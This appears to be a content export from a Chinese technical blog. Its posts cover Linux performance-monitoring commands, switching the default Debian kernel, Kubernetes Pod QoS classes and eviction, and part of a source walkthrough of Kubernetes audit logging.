展示一些扩展的统计文件 iostat结果为两部分，avg-cpu 与 Device，均是指自开机以来的统计\navg-cpu部分：\n%user：在用户级别（应用程序）执行时的CPU平均使用率。 %nice：具有良好级别的用户级别（应用程序）执行时的CPU平均使用率。 %system：显示在内核级别执行时发生的CPU使用率。 这里不包括耗时的硬/软中断服务 %iowait：CPU 或 CPU 处于空闲状态期间系统有未完成的磁盘 I/O 请求。 %steal： 一个或多个虚拟CPU当在虚拟机管理器服务与另一个虚拟处理器时非自愿等待时间所花费的百分比 %idle : 一个或多个CPU处于idle状态，并且系统没有尚未完成的磁盘 I/O 请求 Device部分：\ntps - 表示每秒发送给设备的传输次数。 Blk_read/s (kB_read/s, MB_read/s) - 表示每秒从设备读取的数据量，以块（KB、MB）表示。 Blk_wrtn/s (kB_read/s, MB_read/s) - 表示每秒写入设备的数据量，以块（KB、MB）表示。 Blk_read (kB_read, MB_read) - 读取块总数（KB、MB） Blk_wrtn (kB_read, MB_read)- 写入块总数（KB、MB） $ iostat Linux 5.10.0-16-amd64 (debian-template) 12/11/2022 _x86_64_\t(2 CPU) avg-cpu: %user %nice %system %iowait %steal %idle 0.04 0.00 0.09 0.00 0.00 99.87 Device tps kB_read/s kB_wrtn/s kB_dscd/s kB_read kB_wrtn kB_dscd sda 0.26 8.22 1.88 0.00 578135 131934 0 使用示例\n# 显示CPU使用率 iostat -c # 显示CPU使用率 按照周期刷新 sec iostat -c N # 设备使用率 iostat -d # 以人类可读方式展示 iostat -h # 显示一些扩展选项 iostat -x # 以kb为单位展示 iostat -k # 以mb为单位展示 iostat -m # 显示设备与分区的使用率 iostat -p # 显示指定设备的使用率 iostat -p \u0026lt;device_name\u0026gt; # 忽略非活跃设备 iostat -z htop htop可以理解为linux中的与windows任务管理器相同的产品，与top不同的是，htop是一个支持交互式的top命令\n各系统下的包名与安装\nUbuntu/Debian/Mint：apt install htop -y RHEL/CentOS/Fedora：yum install -y htop CPU和内存使用状态 htop上部屏幕，为CPU和存储使用详情\n显示的颜色 默认模式\n蓝色：低优先级进程（nice\u0026gt; 0） 绿色：正常（用户）流程 红色：内核时间（内核，iowait，irqs \u0026hellip;） 橙色：有效时间（窃取时间+访客时间） 详细模式\n蓝色：低优先级线程（nice\u0026gt; 0） 绿色：正常（用户）流程 红色：系统进程 橙色：IRQ时间 洋红色：IRQ时间较慢 灰色：IO等待时间 青色：偷时间 青色：访客时间 内存计量器更简单：\n绿色：已用内存页 蓝色：缓冲页 橙色：缓存页面 可以通过f1查看帮助对于颜色的说明\nldd sar sar System Activity Report的简写，可以用于收集、报告或保存系统活动的统计信息，如 Linux 系统中的 CPU 利用率、内存使用情况、I/O 设备使用情况。 sar 命令显示自系统启动以来的平均统计信息。它在输出中生成报告，也可以保存在文件中。\n各系统下的包名与安装\nUbuntu/Debian/Mint：apt install sysstat -y RHEL/CentOS/Fedora：yum install -y sysstat Notes：sar是服务，需要开启收集才可以查询到，配置 /etc/default/sysstat 修改为 ENABLED=\u0026quot;false\u0026quot; 然后重启服务 systemctl restart sysstat.service\nsar语法\n$ sar [option] [interval] [count] 更多可以参考 [5]\nioping ioping是一款磁盘延迟监控工具\nUbuntu/Debian/Mint：apt install -y ioping RHEL/CentOS/Fedora：yum install -y ioping Option describe -c count ping的次数 -i interval 每次请求的间隔 -t time 最大有效的请求事件，太慢的请求将被忽略 -s size 请求大小 -S wsize -o offset 在 file/device 开始的偏移量 -w deadline 在多少时间后停止 -p period 打印每秒请求的原生统计数据 -A 使用异步IO (syscalls io_submit(2), io_submit(2), -B 批量模式，以安静的原始数据方式统计最终的数据 -C 使用 cached I/O 在posix_fadvise(2)读取之前 和写入 fdatasync(2)之后，来抑制缓存失效。 -D 使用direct I/O (O_DIRECT in open(2)). -L 使用序列操作而不是随机操作，这相当于设置了默认大小，例如 -s 256k 与这个是相同的 -R 磁盘查找速度测试，这个选项将以人类可读模式输出每个请求\n设置默认间隔为0, -i=0停止测量将在3秒后停止 -w=3设置工作集大小为64m -S=64m -W 写而不是读。目录目标安全。写入 I/O 为不支持或在某种级别缓存非缓存读取从而提供更可靠的结果。对于file/device来说是危险的：这将会粉碎数据。 -Y 使用同步IO (O_SYNC in open(2)). -y 使用数据同步IO (O_DSYNC in open(2)). -k 重用临时工作目录文件 \u0026ldquo;ioping.tmp\u0026rdquo; （仅对于目标目录生效） -q Suppress periodical human-readable output. 使用示例\nRAW STATISTICS\n$ ioping -p 100 -c 200 -i 0 -q . 100 16282962 6141 25155128 130599 162830 328499 37909 101 17115660 上面输出的结果意思为：\n统计请求的计数 运行时间 usec 微秒 每秒请求 (iops) 传输速率 (bytes/sec) 最小请求时间 (usec) 平均请求时间 (usec) 最大请求时间 (usec) 请求时间偏差 (usec) 总请求 （包含很慢和很快的） 总共运行时间 (usec) # 使用默认值和当前目录 测试磁盘 I/O 延迟，ctrl - c 中断。 ioping . # 测量/tmp设备的延迟，总计使用10个请求，每个请求1MB ioping -c 10 -s 1M /tmp # 测量 设备 /dev/sda 的查找速度 ioping -R /dev/sda # 测试设备磁盘序列速度 ioping -RL /dev/sda # 获取磁盘序列的速度（每秒多少字节） ioping -RLB . | awk '{print $4}' vnstat vnstat是 Linux 中用于监控网络参数的命令，通常查看带宽消耗或一些流入或流出的流量，与网络接口上的流量。\n各系统下的包名与安装\nUbuntu/Debian/Mint：apt install -y vnstat RHEL/CentOS/Fedora：epel yum install -y vnstat vnstat是一个守护进程，如果需要记录需要启动这个服务才可以，而不是一个单独的命令\n# 以小时显示流量 vnstat -h # 以天显示流量 vnstat -d # 以月为单位展示 vnstat -m # 计算接口多长时间内的流量（这个是实时的，可以不用启动服务） vnstat -tr 10 # 10 sec # 指定一个接口 vnstat -i eth0 # 指定输出格式 vnstat --json vnstat --xml ifstat ifstat是Linux下网络接口统计的命令\nUbuntu/Debian/Mint：apt install -y ifstat RHEL/CentOS/Fedora：yum install -y ifstat # 指定接口名 ifstat eth0 # 查看全部接口 ifstat -a # 清除网络接口的数据 ifstat -z \u0026lt;interface_name\u0026gt; # 展示x秒内网络数据的平均值 ifstat -t 10 iptraf iptraf是Linux 中交互式的网络监控命令，通过交互式实现展示\n各系统下的包名与安装\nUbuntu/Debian/Mint：apt install -y iptraf-ng RHEL/CentOS/Fedora：yum install -y iptraf-ng iftop 各系统下的包名与安装\nUbuntu/Debian/Mint：apt install -y iftop RHEL/CentOS/Fedora：epel yum install -y iftop # 指定端口的带宽统计 iftop -i enp0s8 # 隐藏顶部的流量刻度栏 iftop -b # 不使用域名解析 iftop -n -i enp0s8 # 直接输出为文字，而不是交互式 iftop -t # 显示指定子网的流量 iftop -F 192.168.2.0/24 # 根据source addr排序 iftop -o source # 根据destnation addr排序 iftop -o destination # 显示使用的带宽 iftop -B -i enp0s8 arpwatch arpwatch是Linux上用于监视ARP记录的\n各系统下的包名与安装\nUbuntu/Debian/Mint：apt install -y arpwatch RHEL/CentOS/Fedora：epel yum install -y arpwatch Option describe -d debug模式 -f 设置用于存储 ethernet/ip address 的文件，默认在 /var/arpwatch/arp.dat -i 指定默认接口 -n 指定本地网络 -u 指定用户或用户组 -Q The flags prevents arpwatch from sending reports by mail -z 设置忽略的 IP范围，IP和掩码用 \u0026ldquo;/\u0026rdquo; 化为，如 -z 192.168.10.0/255.255.255.0 # 指定一个接口，命令并没有输出，当有新IP或MAC被改变时，会保存到/var/log/messages arpwatch -i eth0 Reference [1] perf Examples\n[2] User-space introspection with Linux perf\n[3] Getting Debugging Symbols\n[4] Linux Perf Tools Tips\n[5] 20 sar command examples in Linux\n[6] A Guide to the htop command in Linux\n","permalink":"https://www.oomkill.com/2022/12/performance-command/","summary":"","title":"长期总结 - Linux性能分析命令"},{"content":"搜索linux 内核 image\napt-cache search linux-image 然后安装对应image\nsudo apt install linux-image-\u0026lt;flavour\u0026gt; 安装完成后可以看到对应的image\n$ dpkg -l|grep linux-image ri linux-image-5.10.0-16-amd64 5.10.127-2 amd64 Linux 5.10 for 64-bit PCs (signed) ii linux-image-5.10.0-16-amd64-dbg 5.10.127-2 amd64 Debug symbols for linux-image-5.10.0-16-amd64 ii linux-image-amd64 5.10.127-2 amd64 Linux for 64-bit PCs (meta-package) 可以通过命令查看拥有的内核启动项\ngrep -e \u0026quot;menuentry \u0026quot; -e submenu -e linux /boot/grub/grub.cfg 需要修改至新内核可以修改 /etc/default/grub 下的 GRUB_DEFAULT=\n这里要填的值为上面命令查询出的，例如 menuentry 'Debian GNU/Linux, with Linux 5.10.0-16-amd64'\nGRUB_DEFAULT=\u0026quot;1\u0026gt;Debian GNU/Linux, with Linux 5.10.0-12-amd64\u0026quot; 然后执行 update-grub\nReference HowToUpgradeKernel\nHow to set default kernel in Debian?\n","permalink":"https://www.oomkill.com/2022/12/debian-update-kernel/","summary":"","title":"debian11更新内核版本"},{"content":"服务质量 Quality of Service (QoS)，在Kubernetes是用于解决资源抢占，延迟等方向的一种技术，是服务于调度与抢占之间的条件。\nQoS 级别 QoS 与 资源限制紧密相关，正如下属展示，是一个Pod资源限制部分的配置\nresources: limits: cpu: 200m memory: 1G requests: cpu: 500m memory: 1G 而Kubernetes 将Pod QoS 根据 CPU 与 内存的配置，将QoS分为三个等级：\nGuaranteed：确保的，只设置 limits 或者 requests 与 limits 为相同时则为该等级 Burstable：可突发的，只设置 requests 或 requests 低于 limits 的场景 Best-effort： 默认值，如果不设置则为这个等级 为什么要关心Pod QoS级别 在Kubernetes中，将资源分为两类：可压缩性资源 “CPU”，不可压缩性资源 “内存”。当可压缩性资源用尽时，不会被终止与驱逐，而不可压缩性资源用尽时，即Pod内存不足，此时会被OOMKiller杀掉，也就是被驱逐等操作，而了解Pod 的QoS级别可以有效避免关键Pod被驱逐。\n图：Pod QoS分类 Source：https://doc.kaas.thalesdigital.io/docs/BestPractices/QOS\n有上图可知，BestEffort 级别的 Pod 能够使用节点上所有资源，浙江导致其他 Pod 出现资源问题。所以这类 Pod 优先级最低，如果系统没有内存，将首先被杀死。\nPod是如何被驱逐的 当节点的计算资源不足时，kubelet 会发起驱逐，这个操作是为了避免系统OOM事件，而QoS的等级决定了驱逐的优先级，没有限制资源的 BestEffort 类型的Pod最先被驱逐，接下来资源使用率低于 Requests 的 Guaranteed 与 Burstable 将不会被其他Pod的资源使用量而驱逐，其次对于此类Pod而言，如果Pod使用了比配置（Requests）更多的资源时，会根据这两个级别Pod的优先级进行驱逐。 BestEffort 与 **Burstable **将按照先优先级，后资源使用率顺序进行驱逐\n对于磁盘压力来讲，驱逐顺序根据 BestEffort ==》Burstable ==》Guaranteed 进行驱逐\n如何查看Pod的QoS等级 Pod资源清单中 Status 字段代表Pod QoS等级\nkubectl get pod \u0026lt;pod_name\u0026gt; -o jsonpath='{.status.qosClass}' 如何配置QoS默认级别 如果不想对每个Pod都配置资源限制，Kubernetes提供了一个API LimitRange 可以指定默认的QoS，为Pod提供默认的资源限制，然后准入控制器会增加默认的资源限制 k8s.io/kubernetes/plugin/pkg/admission/limitranger，正如官方给出的实例一样\nNotes：准入控制器与Pod控制器概念不同，准入控制器是 kube-apiserver 请求时的hander chain\napiVersion: v1 kind: LimitRange metadata: name: cpu-resource-constraint spec: limits: - default: # this section defines default limits cpu: 500m defaultRequest: # this section defines default requests cpu: 500m max: # max and min define the limit range cpu: \u0026quot;1\u0026quot; min: cpu: 100m 准入控制器会进行检查，而 LimitRange 也是一个标准，限制所有Pod的资源限制标准（Request 与 limits ）必须小于等于 LimitRange 配置的格式，例如下列配置将不会被准入\napiVersion: v1 kind: Pod metadata: name: example-conflict-with-limitrange-cpu spec: containers: - name: demo image: registry.k8s.io/pause:2.0 resources: requests: cpu: 700m 由于该Pod没有配置 Limits ，不符合规范，该Pod不会被调度，错误如下\nPod \u0026quot;example-conflict-with-limitrange-cpu\u0026quot; is invalid: spec.containers[0].resources.requests: Invalid value: \u0026quot;700m\u0026quot;: must be less than or equal to cpu limit 如果同时设置 request 和 limit ，即使大于LimitRange 的配置，新的 Pod 也会被成功调度：\napiVersion: v1 kind: Pod metadata: name: example-no-conflict-with-limitrange-cpu spec: containers: - name: demo image: registry.k8s.io/pause:2.0 resources: requests: cpu: 700m limits: cpu: 700m ","permalink":"https://www.oomkill.com/2022/12/kubernetes-pod-qos/","summary":"","title":"理解Kubernetes驱逐核心 - Pod QoS"},{"content":"驱逐 (eviction) 是指终止在Node上运行的Pod，保证workload的可用性，对于使用Kubernetes，了解驱逐机制是很有必要性的，因为通常情况下，Pod被驱逐是需要解决驱逐背后导致的问题，而想要快速定位就需要对驱逐机制进行了解。\nPod被驱逐原因 Kubernetes官方给出了下属Pod被驱逐的原因：\n抢占驱逐 (Preemption and Eviction) [1] 节点压力驱逐 (Node-pressure) [2] 污点驱逐 (Taints) [3] 使用API发起驱逐 (API-initiated) [4] 排出Node上的Pod (drain) [5] 被 controller-manager 驱逐 抢占和优先级 抢占是指当节点资源不足以运行新添加的Pod时，kube-scheduler 会检查低优先级Pod而后驱逐掉这些Pod以将资源分配给优先级高的Pod。这个过程称为 “抢占” 例如这个实例是 kube-proxy 被驱逐的场景\n节点压力驱逐 节点压力驱逐是指，Pod所在节点的资源，如CPU, 内存, inode等，这些资源被分为可压缩资源CPU (compressible resources) 与不可压缩资源 (incompressible resources) 磁盘IO, 内存等，当不可压缩资源不足时，Pod会被驱逐。对于此类问题的驱逐 是每个计算节点的 kubelet 通过捕获 cAdvisor 指标来监控节点的资源使用情况。\n被 controller-manager 驱逐 kube-controller-manager 会定期检查节点的状态，如节点处于 NotReady 超过一定时间，或Pod部署长时间失败，这些Pod由控制平面 controller-manager 创建新的Pod已替换存在问题的Pod\n通过API发起驱逐 Kubernetes为用户提供了驱逐的API，用户可以通过调用API来实现自定义的驱逐。\n对于 1.22 以上版本，可以通过API policy/v1 进行驱逐\ncurl -v \\ -H 'Content-type: application/json' \\ https://your-cluster-api-endpoint.example/api/v1/namespaces/default/pods/quux/eviction -d '\\ { \u0026quot;apiVersion\u0026quot;: \u0026quot;policy/v1\u0026quot;, \u0026quot;kind\u0026quot;: \u0026quot;Eviction\u0026quot;, \u0026quot;metadata\u0026quot;: { \u0026quot;name\u0026quot;: \u0026quot;quux\u0026quot;, \u0026quot;namespace\u0026quot;: \u0026quot;default\u0026quot; } }' 例如，要驱逐Pod netbox-85865d5556-hfg6v，可以通过下述命令\n# 1.22+ $ curl -v 'https://10.0.0.4:6443/api/v1/namespaces/default/pods/netbox-85865d5556-hfg6v/eviction' \\ --header 'Content-Type: application/json' \\ --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt \\ --key /etc/kubernetes/pki/apiserver-kubelet-client.key \\ --cacert /etc/kubernetes/pki/ca.crt \\ -d '{ \u0026quot;apiVersion\u0026quot;: \u0026quot;policy/v1\u0026quot;, \u0026quot;kind\u0026quot;: \u0026quot;Eviction\u0026quot;, \u0026quot;metadata\u0026quot;: { \u0026quot;name\u0026quot;: \u0026quot;netbox-85865d5556-hfg6v\u0026quot;, \u0026quot;namespace\u0026quot;: \u0026quot;default\u0026quot; } }' # 1.22- curl -v 'https://10.0.0.4:6443/api/v1/namespaces/default/pods/netbox-85865d5556-hfg6v/eviction' \\ --header 'Content-Type: application/json' \\ --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt \\ --key /etc/kubernetes/pki/apiserver-kubelet-client.key \\ --cacert /etc/kubernetes/pki/ca.crt \\ -d '{ \u0026quot;apiVersion\u0026quot;: \u0026quot;policy/v1beta1\u0026quot;, \u0026quot;kind\u0026quot;: \u0026quot;Eviction\u0026quot;, \u0026quot;metadata\u0026quot;: { \u0026quot;name\u0026quot;: \u0026quot;netbox-85865d5556-hfg6v\u0026quot;, \u0026quot;namespace\u0026quot;: \u0026quot;default\u0026quot; } }' 可以看到结果，旧Pod被驱逐，而新Pod被创建，在这里实验环境节点较少，所以体现为没有更换节点\n$ kubectl get pods -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES netbox-85865d5556-hfg6v 1/1 Terminating 0 101d 192.168.1.213 master-machine \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; netbox-85865d5556-vlgr4 1/1 Running 0 101d 192.168.0.4 node01 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; netbox-85865d5556-z6vqx 1/1 Running 0 11s 192.168.1.220 master-machine \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 通过API驱逐返回状态 200 OK|201 Success：允许驱逐，Eviction 类似于向Pod URL发送 DELETE 请求 429 Too Many Requests：由于API限速可能会看到该相应，另外也为配置原因，不允许驱逐 poddisruptionbudget (PDB是一种保护机制，将总是确保一定数量或百分比的Pod 被自愿驱逐) 500 Internal Server Error：不允许驱逐，存在错误配置，如多个PDB引用一个 Pod 排出Node上的Pod drain 是kubernetes 1.5+之后提供给用户维护命令，通过这个命令 (kubectl drain \u0026lt;node_name\u0026gt;) 可以驱逐该节点上运行的所有Pod，已用来对节点主机进行操作（如内核升级，重启）\nNotes：kubectl drain \u0026lt;node_name\u0026gt; 一次只能接一个nodename [6]\n污点驱逐 污点通常与容忍度同时使用，拥有污点的node，Pod将不会被调度至该节点，而容忍度将允许一定的污点来调度 pod。\n在Kubernetes 1.18+后，允许基于污点的驱逐机制，即kubelet在某些情况下会自动添加节点从而进行驱逐：\nKubernetes内置了一些污点，此时 Controller 会自动污染节点：\nnode.kubernetes.io/not-ready: Node故障。对应 NodeCondition 的Ready = False。 node.kubernetes.io/unreachable：Node控制器无法访问节点。对应 NodeCondition Ready= Unknown。 node.kubernetes.io/memory-pressure：Node内存压力。 node.kubernetes.io/disk-pressure：Node磁盘压力。 node.kubernetes.io/pid-pressure：Node有PID压力。 node.kubernetes.io/network-unavailable：Node网络不可用。 node.kubernetes.io/unschedulable：Node不可调度。 【转】实例：Pod被驱逐故障排除过程 [7] 设想一个场景：，有三个工作节点的Kubernetes 集群，版本为 v1.19.0。发现在 worker 1 上运行的一些 pod 被驱逐了\n图：Pod被驱逐的日志 Source：https://www.containiq.com/post/kubernetes-pod-evictions\n从上图可以看出有很多pod被驱逐了，报错信息也很清楚。由于节点上存储资源不足，导致kubelet触发驱逐过程。\n方法1：启用auto-scaler 向集群添加工作节点，要么部署cluster-autoscaler以根据配置的条件自动扩缩容。\n只增加worker的本地存储空间，这涉及到虚拟机的扩容，会导致worker节点暂时不可用。\n方法2：保护关键Pod 在资源清单中指定资源请求和限制，配置QoS (Quality of Service)。当kubelet触发驱逐时，将至少保证这些 pod 不受影响。\n这种施在一定程度上保证了一些关键Pod的可用性。如果节点出现问题时 Pod 没有被驱逐，这将需要执行更多步骤来查找故障。\n运行命令 kubectl get pods 结果显示很多 pod 处于 evicted 状态。检查结果将保存在节点的kubelet日志中。查找对应日志使用 cat /var/paas/sys/log/kubernetes/kubelet.log | grep -i Evicted -C3。\n检查思路 查看Pod容忍度 当Pod故障无法连接或节点无法响应时，可以使用 tolerationSeconds 配置对应时长长短\ntolerations: - key: \u0026quot;node.kubernetes.io/unreachable\u0026quot; operator: \u0026quot;Exists\u0026quot; effect: \u0026quot;NoExecute\u0026quot; tolerationSeconds: 6000 查看防止 Pod 驱逐的条件 如果集群中的节点数小于50，并且故障节点数超过总节点数的55%，则暂停 Pod 驱逐。在这种情况下，Kubernetes 将尝试驱逐故障节点的工作负载（运行在kubernetes中的APP）。\n下属json描述了一个健康的节点\n\u0026quot;conditions\u0026quot;: [ { \u0026quot;type\u0026quot;: \u0026quot;Ready\u0026quot;, \u0026quot;status\u0026quot;: \u0026quot;True\u0026quot;, \u0026quot;reason\u0026quot;: \u0026quot;KubeletReady\u0026quot;, \u0026quot;message\u0026quot;: \u0026quot;kubelet is posting ready status\u0026quot;, \u0026quot;lastHearbeatTime\u0026quot;: \u0026quot;2019-06-05T18:38:35Z\u0026quot;, \u0026quot;lastTransitionTime\u0026quot;: \u0026quot;2019-06-05T11:41:27Z\u0026quot; } ] 如果就绪条件为 Unknown 或 False 的时间超过了 pod-eviction-timeout，node controller 将对分配给该节点上的所有 Pod 执行 API-initiated 类型驱逐。\n检查Pod的已分配资源 Pod会根据节点的资源使用情况被逐出。被逐出的Pod将会根据分配给Pod的节点资源进行调度。管理驱逐”和“调度”的条件由不同的规则组成。这种结果会导致，被逐出的容器可能会被重新安排到原始节点。因此，要合理分配资源给每个容器。\n检查Pod 是否定期失败 Pod 可以被驱逐多次。即如果在 Pod 被驱逐并调度到新节点后该节点中的 Pod 也被驱逐，则该 Pod 将再次被驱逐。\n如果驱逐动作是由 kube-controller-manager 触发的，则保留处于 Terminating 状态的 Pod 。在节点恢复后，Pod将被 自动销毁。如果节点已经被删除或者其他原因无法恢复，可以强制删除Pod。\n如果是由 kubelet 触发的驱逐，Pod 状态将保留为 Evicted 状态。仅用于后期故障定位，可直接删除。\n删除被逐出的 Pod 命令为：\nkubectl get pods | grep Evicted | awk ‘{print $1}’ | xargs kubectl delete pod Notes：\n被Kubernetes驱逐的Pod，不会被自动重新创建 pod。如果要重新创建Pod，需要使用replicationcontroller、replicaset和 deployment 机制，这也是上述提到的Kubernetes的工作负载。 Pod控制器是协调一组Pod始终为理想状态的控制器，所以会删除后重建，也是Kubernetes 声明式API的特点 如何监控被驱逐的Pod 使用Prometheus kube_pod_status_reason{reason=\u0026quot;Evicted\u0026quot;} \u0026gt; 0 使用 ContainIQ ContainIQ 是为Kubernetes设计的可观测性工具，其中包含Kubernetes 事件仪表板，这就包括 Pod 驱逐事件\nReference [1] Scheduling, Preemption and Eviction\n[2] Node-pressure Eviction\n[3] Taints and Tolerations\n[4] API-initiated Eviction\n[5] Safely Drain a Node\n[6] Draining multiple nodes in parallel\n[7] Kubernetes Pod Evictions | Troubleshooting and Examples\n[8] kubernetes pod evicted\n","permalink":"https://www.oomkill.com/2022/11/kubernetes-eviction/","summary":"","title":"kubernetes概念 - 理解Kubernetes的驱逐机制"},{"content":"Overview 本文是关于Kubernetes 4A解析的第四章\n深入理解Kubernetes 4A - Authentication源码解析 深入理解Kubernetes 4A - Authorization源码解析 深入理解Kubernetes 4A - Admission Control源码解析 深入理解Kubernetes 4A - Audit源码解析 所有关于Kubernetes 4A四部分代码上传至仓库 github.com/cylonchau/hello-k8s-4A\n审计是信息系统中非常重要的一部分，Kubernetes 1.11中也增加了审计 (Auditing) 功能，通过审计功能获得 deployment, ns,等资源操作的事件。\nobjective：\n从设计角度了解Auditing在kubernets中是如何实现的 了解kubernetes auditing webhook 完成实验，通过webhook来收集审计日志 如有错别字或理解错误地方请多多担待，代码是以1.24进行整理，实验是以1.19环境进行，差别不大。\nKubernetes Auditing 根据Kubernetes官方描述审计在kubernetes中是有控制平面 kube-apiserver 中产生的一个事件，记录了集群中所操作的资源，审计围绕下列几个维度来记录事件的：\n发生了什么 发生的事件 谁触发的 发生动作的对象 在哪里检查到动作的 从哪触发的 处理行为是什么 审计生命周期开始于组件 kube-apiserver 准入控制阶段，在每个阶段内都会产生审计事件并经过预处理后写入后端，目前后端包含webhook与日志文件。\n审计日志功能增加了 kube-apiserver 的内存消耗，因为会为每个请求存储了审计所需的上下文。内存的消耗取决于审计日志配置 [1]。\n审计事件设计 审计的schema不同于资源API的设计，没有 metav1.ObjectMeta 属性，Event是一个事件的结构体，Policy是事件配置，属于kubernetes资源，在代码 k8s.io/apiserver/pkg/apis/audit/types.go 可以看到\ntype Event struct { metav1.TypeMeta `json:\u0026quot;,inline\u0026quot;` Level Level `json:\u0026quot;level\u0026quot; protobuf:\u0026quot;bytes,1,opt,name=level,casttype=Level\u0026quot; AuditID types.UID `json:\u0026quot;auditID\u0026quot; protobuf:\u0026quot;bytes,2,opt,name=auditID,casttype=k8s.io/apimachinery/pkg/types.UID\u0026quot;` Stage Stage `json:\u0026quot;stage\u0026quot; protobuf:\u0026quot;bytes,3,opt,name=stage,casttype=Stage\u0026quot;` RequestURI string `json:\u0026quot;requestURI\u0026quot; protobuf:\u0026quot;bytes,4,opt,name=requestURI\u0026quot;` Verb string `json:\u0026quot;verb\u0026quot; protobuf:\u0026quot;bytes,5,opt,name=verb\u0026quot;` User authnv1.UserInfo `json:\u0026quot;user\u0026quot; protobuf:\u0026quot;bytes,6,opt,name=user\u0026quot;` ImpersonatedUser *authnv1.UserInfo `json:\u0026quot;impersonatedUser,omitempty\u0026quot; protobuf:\u0026quot;bytes,7,opt,name=impersonatedUser\u0026quot;` SourceIPs []string `json:\u0026quot;sourceIPs,omitempty\u0026quot; protobuf:\u0026quot;bytes,8,rep,name=sourceIPs\u0026quot;` UserAgent string `json:\u0026quot;userAgent,omitempty\u0026quot; protobuf:\u0026quot;bytes,16,opt,name=userAgent\u0026quot;` ObjectRef *ObjectReference `json:\u0026quot;objectRef,omitempty\u0026quot; protobuf:\u0026quot;bytes,9,opt,name=objectRef\u0026quot;` // +optional ResponseStatus *metav1.Status `json:\u0026quot;responseStatus,omitempty\u0026quot; protobuf:\u0026quot;bytes,10,opt,name=responseStatus\u0026quot;` ... } 对于记录的认证事件来说，会根据请求阶段记录审计的阶段，主要分为下属集中情况，每个请求会记录其中一个验证阶段，如代码所示 [1]\nconst ( // 这个阶段是audit handler收到请求后立即生成事件的阶段，然后委托handler chain处理。 StageRequestReceived Stage = \u0026quot;RequestReceived\u0026quot; // 这个阶段阶段仅对长时间运行的请求如 watch // 将在发送响应标头后，响应正文之前生成的阶段 StageResponseStarted Stage = \u0026quot;ResponseStarted\u0026quot; // 这个阶段是发送相应体后的事件。 StageResponseComplete Stage = \u0026quot;ResponseComplete\u0026quot; // 如果程序出现panic，则触发这个阶段 StagePanic Stage = \u0026quot;Panic\u0026quot; ) 审计工作流程 审计真正工作的地方在 k8s.io/apiserver/pkg/endpoints/filters/audit.go.WithAudit 函数，下面对与官方文档说明与这个实际代码进行结合\nfunc WithAudit(handler http.Handler, sink audit.Sink, policy audit.PolicyRuleEvaluator, longRunningCheck request.LongRunningRequestCheck) http.Handler { // sink是一个backend（webhook 或 日志），policy则是自定义的事件配置 // 如果两者之一未配置，则不会使用审计功能 if sink == nil || policy == nil { return handler } return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) { // 通过给定的配置与请求构建出一个事件 context // 这里可以看到 auditContext, err := evaluatePolicyAndCreateAuditEvent(req, policy) if err != nil { utilruntime.HandleError(fmt.Errorf(\u0026quot;failed to create audit event: %v\u0026quot;, err)) responsewriters.InternalError(w, req, errors.New(\u0026quot;failed to create audit event\u0026quot;)) return } // 下面代码可以看出是对事件context进行构建，与拿到来自请求Context ev := auditContext.Event if ev == nil || req.Context() == nil { handler.ServeHTTP(w, req) return } req = req.WithContext(audit.WithAuditContext(req.Context(), auditContext)) ctx := req.Context() omitStages := auditContext.RequestAuditConfig.OmitStages // 这里到StageRequestReceived阶段，如果是收到请求阶段则通过注入的后端进行处理 ev.Stage = auditinternal.StageRequestReceived if processed := processAuditEvent(ctx, sink, ev, omitStages); !processed { audit.ApiserverAuditDroppedCounter.WithContext(ctx).Inc() responsewriters.InternalError(w, req, errors.New(\u0026quot;failed to store audit event\u0026quot;)) return } // 拦截watch类长请求的状态码 var longRunningSink audit.Sink if longRunningCheck != nil { ri, _ := request.RequestInfoFrom(ctx) if longRunningCheck(req, ri) { longRunningSink = sink } } respWriter := decorateResponseWriter(ctx, w, ev, longRunningSink, omitStages) // send audit event when we leave this func, either via a panic or cleanly. In the case of long // running requests, this will be the second audit event. // 在离开函数前会处理 ResponseStarted、ResponseComplete、Panic这三个阶段 defer func() { if r := recover(); r != nil { defer panic(r) // 当前发生panic的请求 ev.Stage = auditinternal.StagePanic ev.ResponseStatus = \u0026amp;metav1.Status{ Code: http.StatusInternalServerError, Status: metav1.StatusFailure, Reason: metav1.StatusReasonInternalError, Message: fmt.Sprintf(\u0026quot;APIServer panic'd: %v\u0026quot;, r), } processAuditEvent(ctx, sink, ev, omitStages) return } // if no StageResponseStarted event was sent b/c neither a status code nor a body was sent, fake it here // But Audit-Id http header will only be sent when http.ResponseWriter.WriteHeader is called. fakedSuccessStatus := \u0026amp;metav1.Status{ Code: http.StatusOK, Status: metav1.StatusSuccess, Message: \u0026quot;Connection closed early\u0026quot;, } if ev.ResponseStatus == nil \u0026amp;\u0026amp; longRunningSink != nil { ev.ResponseStatus = fakedSuccessStatus ev.Stage = auditinternal.StageResponseStarted processAuditEvent(ctx, longRunningSink, ev, omitStages) } // ResponseStarted 在响应头发送后，响应体发送前的事件。watch会触发他 ev.Stage = auditinternal.StageResponseComplete if ev.ResponseStatus == nil { // 没有相应状态 正是上面构造的fakedSuccessStatus ev.ResponseStatus = fakedSuccessStatus } // 将事件发送到后端 processAuditEvent(ctx, sink, ev, omitStages) }() handler.ServeHTTP(respWriter, req) }) } 在评估请求时，会调用 GetAuthorizerAttributes(ctx) ，这里通过授权记录然后来通过给定的审计配置来\n当在将事件发送到后端时，使用 processAuditEvent() 函数，最终修改时间后会转交至后端函数，例如webhook，会请求后端配置的webhook url的客户端，最终被执行 return sink.ProcessEvents(ev)\nfunc (b *backend) processEvents(ev ...*auditinternal.Event) error { var list auditinternal.EventList for _, e := range ev { list.Items = append(list.Items, *e) } return b.w.WithExponentialBackoff(context.Background(), func() rest.Result { trace := utiltrace.New(\u0026quot;Call Audit Events webhook\u0026quot;, utiltrace.Field{\u0026quot;name\u0026quot;, b.name}, utiltrace.Field{\u0026quot;event-count\u0026quot;, len(list.Items)}) // Only log audit webhook traces that exceed a 25ms per object limit plus a 50ms request overhead allowance. The high per object limit used here is primarily to allow enough time for the serialization/deserialization of audit events, which contain nested request and response objects plus additional event fields. defer trace.LogIfLong(time.Duration(50+25*len(list.Items)) * time.Millisecond) return b.w.RestClient.Post().Body(\u0026amp;list).Do(context.TODO()) }).Error() } 在 